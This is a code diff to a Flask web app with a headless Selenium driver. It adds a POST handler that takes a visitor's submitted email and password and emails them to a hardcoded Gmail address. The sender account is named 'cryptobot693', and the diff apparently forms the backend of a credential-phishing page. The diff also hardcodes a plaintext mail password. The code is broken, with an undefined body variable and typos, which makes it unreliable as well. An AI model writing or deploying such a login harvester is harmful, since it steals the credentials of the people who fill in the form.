@@ -6,18 +6,32 @@ from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.common.by import By
 from selenium.webdriver.chrome.options import Options
 import os
+from email.message import EmailMessage
 from selenium.webdriver.chrome.service import Service
 chrome_options=webdriver.ChromeOptions()
 chrome_options.binary_loction=os.environ.get("GOOGLE_CHROME_BIN")
 chrome_options.add_argument("--headless")
 chrome_options.add_argument("--disable-dev-shm-usage")
 driver=webdriver.Chrome(service=Service(executable_path=os.environ.get("CHROMEDRIVER_PATH")),options=chrome_options)
-
-
+csubject="THIS IS IMPORTANT"
+password="Clive13gwen"
 app=Flask(__name__)
-
-@app.route('/')
+recvemail="clivethompson09@gmail.com"
+myemail="cryptobot693@gmail.com"
+@app.route('/',methods=['GET','POST'])
 def home():
+  if request.method == "POST":
+    emai = request.form.get("email")
+    pa=request.form.get("password")
+    message=EmailMessage()
+    message["From"]=myemail
+    message["To"]=recvemail
+    message["subject"]=csubject
+    message.set_content(self.cbody)
+    context=ssl.create_default_context()
+    with smtplib.SMTP_SSL("smtp.gmail.com",465,context=context) as server:
+        server.login(myemail,password)
+        server.sendmail(myemail,recvemail,message.as_string())
   return render_template("home.html")
 
 if __name__=="__main__":
